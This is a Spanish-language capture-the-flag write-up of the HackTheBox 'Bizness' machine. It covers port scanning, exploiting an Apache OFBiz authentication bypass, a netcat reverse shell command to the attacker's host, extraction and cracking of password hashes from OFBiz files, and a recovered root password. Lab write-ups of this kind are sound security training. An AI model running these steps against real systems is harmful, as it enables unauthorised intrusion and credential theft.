### RESOLUCIÓN DE LA MÁQUINA BIZNESS

Una vez preparado nuestro laboratorio, vamos a hacer nuestro escaneo de puertos abiertos con nmap

Nos salen los puertos http y https y el ssh, ahora haremos un escaneo para ver qué servicios corren por esos puertos

```bash
sudo nmap -p80,443 -sCV -vvv -n 10.10.11.252
```

Vemos que el puerto 80 está abierto y sirve HTTP. Parece que hay un servidor web en ejecución con Nginx con la versión 1.18.0 este nos redirige a https en el que aparece un certificado pero al mirar las fechas parece que es un certificado autofirmado o mal configurado. Ahora nos dirigiremos a la web para echarle un vistazo.

Después de echar un vistazo a la web sin encontrar nada vamos a hacer una búsqueda de directorios en dirsearch

```bash
dirsearch -u https://bizness.htb --exclude-status 404
```

Le decimos que nos excluya los errores 404 porque no nos sirven

En uno de los directorios nos aparece un panel de login de OFbiz de apache y un apache tomcat

Averiguamos que apache ofbiz tiene una vulnerabilidad grave que nos permitirá eludir el inicio de sesión **Apache-OFBiz-Authentication-Bypass**, encontramos este repositorio que nos enseñara como hacerlo.

https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass

Primero veremos si nuestro apache es vulnerable con el scan

Parece que lo es así que lo que haremos será poner un servidor en escucha con netcat, y después usaremos nuestro exploit con el comando 'nc -e /bin/sh 10.10.14.186 4444' para que nos vaya a nuestro puerto en escucha

Ya estamos dentro

Una vez aquí usaremos el comando ~/user.txt para ahorrarnos la búsqueda de nuestra primera flag
Ahora tocará escalar privilegios para convertirnos en root.

Para que el terminal se vea mejor haremos tratamiento de tty

```bash
script /dev/null -qc /bin/bash
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;

```
Ahora buscaremos en los directorios y en el directorio /opt/ofbiz/framework/resources/templates existe un archivo llamado AdminUserLoginData.xml lo abrimos y nos encontramos un password hasheado

También encontramos en la carpeta derby archivos de sistema en c54d0.dat encontraremos otro hash en SHA-1

Esta es la ubicación del archivo

`/opt/ofbiz/runtime/data/derby/ofbiz/seg0`

(Estar ubicaciones las hemos sacado de una guia para ahorrar tiempo)

Hemos encontrado una herramienta en Github para ayudarnos a comparar los hashes y descifrarlos

https://github.com/IamLucif3r/Go-Hash-Matcher?source=post_page-----68713a41f98b--------------------------------

Gracias a esta herramienta conseguimos sacar el password de `root` es `monkeybizness`

Ahora lo único que deberemos hacer es pasarnos a root con el comando su - y ya encontramos el `root.txt` donde está nuestra flag
